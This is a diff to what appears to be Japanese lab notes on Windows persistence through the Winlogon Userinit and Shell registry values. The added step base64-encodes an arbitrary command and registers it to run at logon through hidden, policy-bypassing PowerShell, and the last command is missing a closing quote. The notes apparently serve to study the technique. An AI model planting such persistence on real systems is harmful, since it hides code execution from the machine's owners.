@@ -21,3 +21,14 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userini
 # explorer.exeに続き、自身のプログラムを登録
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "C:\Windows\system32\explorer.exe,cmd.exe /c echo Shell_Triggered > C:\Temp\shell_success.txt" /f
 ```
+## Step3 難読化
+実行するコマンドをbase64エンコードしてUserinitに読み込ませる。
+```powershell
+# base64エンコードの準備
+$c = <任意のコマンド>
+$b = [System.text.encoding]::unicode.getbytes($c)
+$e = [Convert]::ToBase64String($b)
+write-host $e
+# 登録
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,powershell -ep bypass -nop -w hidden -e <Base64エンコードされたコマンド> /f
+```
